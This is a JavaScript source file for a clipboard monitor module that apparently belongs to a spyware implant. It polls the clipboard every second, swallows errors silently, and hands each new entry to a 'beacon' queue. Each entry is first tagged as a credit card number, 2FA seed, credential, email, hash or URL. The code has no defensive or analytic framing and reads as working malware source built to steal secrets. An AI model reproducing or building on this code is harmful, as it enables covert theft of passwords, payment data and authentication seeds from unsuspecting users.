/**
 * Clipboard Monitor Module
 * Intercepts clipboard content changes in real-time.
 */

const config = require("../config");
const logger = require("../logger");

class ClipboardModule {
  constructor(beacon) {
    this.beacon = beacon;
    this.lastContent = "";
    this.timer = null;
  }

  start() {
    this.timer = setInterval(() => this._check(), 1000);
    logger.debug("ClipboardModule started");
  }

  stop() {
    clearInterval(this.timer);
  }

  async _check() {
    try {
      const { default: clipboardy } = await import("clipboardy");
      const content = await clipboardy.read();
      if (content && content !== this.lastContent && content.length > 0) {
        this.lastContent = content;
        this.beacon.queue_data("clipboard", {
          content,
          length: content.length,
          ts: Date.now(),
          type: this._detectType(content),
        });
      }
    } catch (err) {
      // Silent fail — clipboard may not be accessible
    }
  }

  _detectType(text) {
    if (/^[a-f0-9]{32,}$/i.test(text)) return "hash";
    if (/^(?:\d{4}[- ]?){4}$/.test(text)) return "credit_card";
    if (/^[\w.+-]+@[\w-]+\.\w+$/.test(text)) return "email";
    if (/^https?:\/\//i.test(text)) return "url";
    if (/^(?:[A-Z2-7]{8})+$/i.test(text) && text.length >= 16) return "2fa_seed";
    if (/password|passwd|pwd|secret|token|key/i.test(text.slice(0, 100))) return "credential";
    return "text";
  }
}

module.exports = ClipboardModule;
